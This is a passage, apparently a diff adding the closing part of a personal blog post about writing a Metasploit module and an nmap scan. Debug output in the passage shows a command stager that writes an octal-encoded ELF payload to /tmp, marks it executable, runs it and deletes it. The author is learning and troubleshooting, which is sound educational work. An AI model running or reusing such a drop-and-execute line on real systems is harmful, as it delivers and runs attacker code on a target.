+</span></span><span class="line"><span class="ln"> 9</span><span class="cl">Sending <span class="nb">command</span> printf%20<span class="s1">&#39;\177\105\114\106\2\1\1\0\0\0\0\0\0\0\0\0\2\0\76\0\1\0\0\0\170\0\100\0\0\0\0\0\100\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\100\0\70\0\1\0\0\0\0\0\0\0\1\0\0\0\7\0\0\0\0\0\0\0\0\0\0\0\0\0\100\0\0\0\0\0\0\0\100\0\0\0\0\0\47\1\0\0\0\0\0\0\326\1\0\0\0\0\0\0\0\20\0\0\0\0\0\0\110\61\311\110\201\351\357\377\377\377\110\215\5\357\377\377\377\110\273\156\146\17\300\113\301\125\262\110\61\130\47\110\55\370\377\377\377\342\364\137\231\145\311\23\130\343\242\46\357\331\215\172\10\77\220\57\74\145\307\21\316\120\372\353\246\167\221\41\313\24\353\76\14\46\230\322\253\127\355\4\147\121\317\116\211\320\162\26\135\107\127\3\170\127\262\177\72\317\150\112\114\4\372\347\200\145\320\21\253\177\352\141\143\126\210\316\1\54\227\47\231\306\264\123\226\77\221\66\14\17\252\116\211\334\125\46\127\371\317\116\230\14\355\46\343\317\271\214\253\151\352\4\147\120\317\116\237\77\314\64\151\12\210\316\1\55\137\221\200\17\300\113\301\125\262&#39;</span>&gt;&gt;/tmp/TnUKZ%20<span class="p">;</span>%20chmod%20%2Bx%20/tmp/TnUKZ%20<span class="p">;</span>%20/tmp/TnUKZ%20<span class="p">;</span>%20rm%20-f%20/tmp/TnUKZ
+</span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="o">[</span>*<span class="o">]</span> Command Stager progress - 100.00% <span class="k">done</span> <span class="o">(</span>993/993 bytes<span class="o">)</span>
+</span></span></code></pre></div><p>Based on these statements, it looks like the payload is emptied before entering <code>execute_command</code>, but <code>execute_command</code> should just be getting <code>payload.encoded</code>, which should be the same value that gets printed out in <code>exploit</code>.
+I don&rsquo;t know why this is happening - if you do, please reach out, but I&rsquo;m giving up on echo for now.</p>
+<h2 id="conclusion">Conclusion</h2>
+<p>This project really improved my understanding of <code>nmap</code> and <code>metasploit</code>, along with getting some exposure to <code>ruby</code>.
+I recommend anyone who uses either of these tools to try to extend them - you&rsquo;ll learn a ton about how they work in the process.
+Actually, that goes for anything. Want to get better at exploiting software?
+Write some exploitable software.
+Want to get better at working with Metasploit modules?
+Make one.</p>
+<p>There are some things that I still want to do, but they&rsquo;re tangential to this project:</p>
+<ul>
+<li>The nmap tools I mentioned in <a href="https://connorshade.com/service-to-shell/writing-nmap-scan/#possible-tooling">Writing an Nmap Scan</a></li>
+<li>Write some more documentation for Metasploit on creating modules, from a standpoint of &ldquo;assume the reader knows programming and how to manually trigger an exploit&rdquo;</li>
+<li>It might be fun to write my own network scanner, compatible with nmap banner grabs and service probes. This could be a good use case for learning Go, and it would be fun trying to tune it to be better. I did a similar project in college - making a simple Harvester clone.</li>
+</ul>
+<p>Thanks for stopping by, and I hope you&rsquo;ve learned something.</p>
+<div class="footnotes" role="doc-endnotes">
+<hr>
+<ol>
+<li id="fn:1">
+<p>Taken from the page <a href="https://docs.metasploit.com/docs/development/developing-modules/guides/how-to-use-command-stagers.html">How to use command stagers</a>&#160;<a href="#fnref:1" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a>&#160;<a href="#fnref1:1" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
+</li>
+</ol>
+</div>
+
+<div style="display: flex; justify-content: space-between;">
+  <span style="text-align: left;">Prev: <a href="https://connorshade.com/service-to-shell/writing-nmap-scan/">Writing a Custom Nmap Scan</a></span>
+  
+</div>
+
+  </main>
+  <footer><small>
+  Connor Shade | Made with <a href="https://gohugo.io/">Hugo</a>, themed by <a href="https://themes.gohugo.io/themes/hugo-bearcub/">Bear Cub</a>
+</small></footer>
+
+    
+</body>
+
+</html>
